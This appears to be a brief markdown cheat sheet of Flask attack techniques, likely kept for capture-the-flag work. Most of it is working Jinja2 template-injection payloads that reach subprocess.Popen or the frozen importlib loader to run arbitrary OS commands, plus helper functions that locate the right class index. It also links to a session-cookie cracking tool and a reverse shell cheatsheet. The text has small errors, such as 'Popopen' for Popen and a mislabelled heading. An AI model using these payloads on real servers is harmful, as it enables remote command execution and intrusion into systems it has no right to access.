# Flask

### Server side template injection

[ref](https://github.com/junron/public-writeups/blob/master/whitehacks-2021/waf.md)

List classes: `{{ "".__class__.__base__.__subclasses__() }}`

Get `subprocess.Popopen`:

```python
def get_popopen(string):
	i = string.index("<class 'subprocess.Popen'>")
	s = string[:i]
	return s.count(",")
```

Execute commands: `{{ "".__class__.__base__.__subclasses__()[<n>]([<cmd>], stdout=-1).communicate() }}`

**Alternative: `frozenimportlib`**

Get `subprocess.Popopen`:

```python
def get_builtinimporter(string):
	i = string.index("<class '_frozen_importlib.BuiltinImporter'>")
	s = string[:i]
	return s.count(",")
```

Execute commands: `{{ "".__class__.__base__.__subclasses__()[<n>]().load_module("os").system(<cmd>) }}`

## Session cracking 

[tool](https://github.com/Paradoxis/Flask-Unsign)

## Reverse shell

[PayloadsAllTheThings/Reverse Shell Cheatsheet.md at master · swisskyrepo/PayloadsAllTheThings (github.com)](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md#python)